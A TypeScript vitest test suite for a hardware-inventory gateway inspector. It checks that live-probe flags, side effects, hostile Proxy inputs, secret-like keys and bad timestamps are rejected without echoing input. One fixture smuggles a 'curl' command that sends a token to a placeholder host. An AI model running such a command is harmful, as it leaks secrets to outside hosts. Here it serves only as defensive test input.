import {
  evaluateHardwareInventoryThreshold,
  type HardwareInventoryThresholdRequest,
} from "@lnsat/packets";
import { describe, expect, it } from "vitest";
import {
  hardwareInventoryInspectionGatewayContract,
  inspectHardwareInventoryGatewayRequest,
} from "../src/index.js";

const now = new Date("2026-07-11T12:00:00.000Z");

describe("@lnsat/api BP-0850 hardware inventory Gateway inspection", () => {
  it("delegates supported caller-supplied inventory exactly to BP-0849", async () => {
    const inventoryRequest = validInventoryRequest();
    const delegated = evaluateHardwareInventoryThreshold(inventoryRequest);
    expect(delegated.ok).toBe(true);

    const response = await inspectHardwareInventoryGatewayRequest(
      {
        request_id: "req_bp0850_supported",
        inventory_request: inventoryRequest,
        live_collection_allowed: false,
        hardware_probe_allowed: false,
        node_agent_allowed: false,
        benchmark_allowed: false,
        placement_allowed: false,
        telemetry_collection_allowed: false,
        runtime_allowed: false,
        side_effects: [],
      },
      { now },
    );

    expect(response).toMatchObject({
      ok: true,
      contract_id: "lnsat.gateway.hardware_inventory.inspect.v0_1",
      request_id: "req_bp0850_supported",
      inspected_at: "2026-07-11T12:00:00.000Z",
      inventory_source: "caller_supplied",
      support_status: "supported",
      reason_codes: [],
      excluded_roles: [],
      constraints: closedConstraints(),
      side_effects: [],
    });
    if (!response.ok || !delegated.ok) throw new Error("expected supported result");
    expect(response.hardware_inventory_threshold).toEqual(
      delegated.hardware_inventory_threshold,
    );
    expect(response.threshold_findings).toEqual(
      delegated.hardware_inventory_threshold.threshold_findings,
    );
    expect(response.eligible_roles).toEqual(
      delegated.hardware_inventory_threshold.eligible_roles,
    );
    expect(response.minimums).toEqual(delegated.hardware_inventory_threshold.minimums);
  });

  it.each([
    ["below_minimum", { cpu: { physical_cores: 2, logical_cores: 4 } }],
    ["quarantined", { integrity: "failed" as const }],
  ])("keeps valid %s evaluations successful", async (status, inventoryPatch) => {
    const request = validInventoryRequest();
    request.inventory = { ...request.inventory, ...inventoryPatch };

    const response = await inspectHardwareInventoryGatewayRequest(
      { inventory_request: request },
      { now },
    );

    expect(response).toMatchObject({
      ok: true,
      support_status: status,
      inventory_source: "caller_supplied",
      constraints: closedConstraints(),
      side_effects: [],
    });
  });

  it("separates delegated inventory errors and withholds rejected input", async () => {
    const response = await inspectHardwareInventoryGatewayRequest(
      {
        request_id: "req_bp0850_invalid_inventory",
        inventory_request: {
          ...validInventoryRequest(),
          command: "curl https://example.invalid/?token:private-value",
          hardware_probe_allowed: true,
        },
      },
      { now },
    );

    expect(response).toMatchObject({
      ok: false,
      request_id: "req_bp0850_invalid_inventory",
      request_errors: [],
      inventory_errors: expect.arrayContaining([
        expect.objectContaining({ code: "hardware_inventory.unexpected_field" }),
        expect.objectContaining({
          code: "hardware_inventory.hardware_probe_forbidden",
        }),
      ]),
      hardware_inventory_threshold: null,
      support_status: null,
      constraints: closedConstraints(),
      raw_input_content: "withheld",
      side_effects: [],
    });
    expect(JSON.stringify(response)).not.toContain("private-value");
    expect(JSON.stringify(response)).not.toContain("curl");
  });

  it("rejects every outer live-control flag and non-empty side effects", async () => {
    const response = await inspectHardwareInventoryGatewayRequest(
      {
        inventory_request: validInventoryRequest(),
        live_collection_allowed: true,
        hardware_probe_allowed: true,
        node_agent_allowed: true,
        benchmark_allowed: true,
        placement_allowed: true,
        telemetry_collection_allowed: true,
        runtime_allowed: true,
        side_effects: ["probe"],
      },
      { now },
    );

    expect(response).toMatchObject({
      ok: false,
      request_errors: [
        expect.objectContaining({
          code: "hardware_inventory_gateway.live_collection_forbidden",
        }),
        expect.objectContaining({
          code: "hardware_inventory_gateway.hardware_probe_forbidden",
        }),
        expect.objectContaining({
          code: "hardware_inventory_gateway.node_agent_forbidden",
        }),
        expect.objectContaining({
          code: "hardware_inventory_gateway.benchmark_forbidden",
        }),
        expect.objectContaining({
          code: "hardware_inventory_gateway.placement_forbidden",
        }),
        expect.objectContaining({
          code: "hardware_inventory_gateway.telemetry_collection_forbidden",
        }),
        expect.objectContaining({
          code: "hardware_inventory_gateway.runtime_forbidden",
        }),
        expect.objectContaining({
          code: "hardware_inventory_gateway.side_effects_forbidden",
        }),
      ],
      inventory_errors: [],
      raw_input_content: "withheld",
      side_effects: [],
    });
  });

  it("snapshots stateful outer values once without raw echo", async () => {
    let requestIdReads = 0;
    let inventoryReads = 0;
    let liveReads = 0;
    const input = Object.create(null) as Record<string, unknown>;
    Object.defineProperties(input, {
      request_id: {
        enumerable: true,
        get() {
          requestIdReads += 1;
          return requestIdReads === 1 ? "req_bp0850_stateful" : "token:must-not-appear";
        },
      },
      inventory_request: {
        enumerable: true,
        get() {
          inventoryReads += 1;
          return validInventoryRequest();
        },
      },
      live_collection_allowed: {
        enumerable: true,
        get() {
          liveReads += 1;
          return liveReads === 1 ? false : "token:must-not-appear";
        },
      },
    });

    const response = await inspectHardwareInventoryGatewayRequest(input, { now });
    expect(response).toMatchObject({ ok: true, request_id: "req_bp0850_stateful" });
    expect(requestIdReads).toBe(1);
    expect(inventoryReads).toBe(1);
    expect(liveReads).toBe(1);
    expect(JSON.stringify(response)).not.toContain("must-not-appear");
  });

  it("fails closed for hostile outer shape without throwing or echoing", async () => {
    const hostile = new Proxy(
      { inventory_request: "token:must-not-appear" },
      {
        ownKeys() {
          throw new Error("token:must-not-appear");
        },
      },
    );

    const response = await inspectHardwareInventoryGatewayRequest(hostile, { now });
    expect(response).toMatchObject({
      ok: false,
      request_id: null,
      request_errors: [
        expect.objectContaining({
          code: "hardware_inventory_gateway.invalid_request",
          path: "",
        }),
      ],
      inventory_errors: [],
      raw_input_content: "withheld",
      constraints: closedConstraints(),
      side_effects: [],
    });
    expect(JSON.stringify(response)).not.toContain("must-not-appear");
  });

  it("rejects unsafe and secret-like outer keys without key or value echo", async () => {
    const response = await inspectHardwareInventoryGatewayRequest(
      {
        inventory_request: validInventoryRequest(),
        password: "must-not-appear",
      },
      { now },
    );

    expect(response).toMatchObject({
      ok: false,
      request_errors: [
        expect.objectContaining({
          code: "hardware_inventory_gateway.invalid_request",
          path: "",
        }),
      ],
      raw_input_content: "withheld",
    });
    expect(JSON.stringify(response)).not.toContain("password");
    expect(JSON.stringify(response)).not.toContain("must-not-appear");
  });

  it("fails closed when a snapshotted outer value becomes uninspectable", async () => {
    const revoked = Proxy.revocable([], {});
    revoked.revoke();

    const response = await inspectHardwareInventoryGatewayRequest(
      {
        inventory_request: validInventoryRequest(),
        side_effects: revoked.proxy,
      },
      { now },
    );

    expect(response).toMatchObject({
      ok: false,
      request_errors: [
        expect.objectContaining({
          code: "hardware_inventory_gateway.invalid_request",
          path: "",
        }),
      ],
      inventory_errors: [],
      raw_input_content: "withheld",
      side_effects: [],
    });
  });

  it("keeps runtime routing isolated from exported contract mutation", async () => {
    expect(Object.isFrozen(hardwareInventoryInspectionGatewayContract)).toBe(true);
    expect(
      Object.isFrozen(hardwareInventoryInspectionGatewayContract.source_docs),
    ).toBe(true);
    expect(() => {
      (
        hardwareInventoryInspectionGatewayContract as { contract_id: string }
      ).contract_id = "mutated";
    }).toThrow(TypeError);

    const response = await inspectHardwareInventoryGatewayRequest(
      { inventory_request: validInventoryRequest() },
      { now },
    );
    expect(response.contract_id).toBe("lnsat.gateway.hardware_inventory.inspect.v0_1");
  });

  it("uses injected time deterministically without mutating input", async () => {
    const input = {
      request_id: "req_bp0850_immutable",
      inventory_request: validInventoryRequest(),
    };
    const before = structuredClone(input);

    const first = await inspectHardwareInventoryGatewayRequest(input, { now });
    const second = await inspectHardwareInventoryGatewayRequest(input, { now });

    expect(first).toEqual(second);
    expect(first.inspected_at).toBe("2026-07-11T12:00:00.000Z");
    expect(input).toEqual(before);
  });

  it.each([
    ["invalid", new Date(Number.NaN)],
    ["hostile", new Proxy(now, {})],
  ])(
    "fails closed for %s inspection time without rejecting",
    async (_label, badNow) => {
      const response = await inspectHardwareInventoryGatewayRequest(
        { inventory_request: validInventoryRequest() },
        { now: badNow },
      );

      expect(response).toMatchObject({
        ok: false,
        inspected_at: null,
        request_errors: [
          expect.objectContaining({
            code: "hardware_inventory_gateway.invalid_inspection_time",
            path: "",
          }),
        ],
        inventory_errors: [],
        raw_input_content: "withheld",
        side_effects: [],
      });
    },
  );
});

function validInventoryRequest(): HardwareInventoryThresholdRequest {
  return {
    inventory: {
      node_id: "node:lab-dell-r730-01",
      observed_at: "2026-07-11T00:00:00.000Z",
      platform: "linux",
      architecture: "x86_64",
      cpu: { physical_cores: 4, logical_cores: 8 },
      memory: {
        total_bytes: 68_719_476_736,
        ecc_status: "supported",
        uncorrectable_error_count: 0,
      },
      pcie: { present: true, max_generation: 3 },
      storage: [
        {
          device_ref: "disk:nvme0",
          medium: "nvme",
          role: "active_workload",
          smart_health: "healthy",
        },
      ],
      network: [
        {
          interface_ref: "nic:eno1",
          speed_mbps: 10_000,
          state: "up",
          error_count: 0,
        },
      ],
      thermal: "normal",
      integrity: "verified",
    },
    hardware_probe_allowed: false,
    benchmark_allowed: false,
    placement_allowed: false,
    telemetry_collection_allowed: false,
    runtime_allowed: false,
    side_effects: [],
  };
}

function closedConstraints() {
  return {
    supplied_inventory_only: true,
    read_only: true,
    recommendation_only: true,
    live_collection_allowed: false,
    hardware_probe_allowed: false,
    benchmark_allowed: false,
    placement_allowed: false,
    telemetry_collection_allowed: false,
    runtime_allowed: false,
    database_write_allowed: false,
    network_access_allowed: false,
  };
}
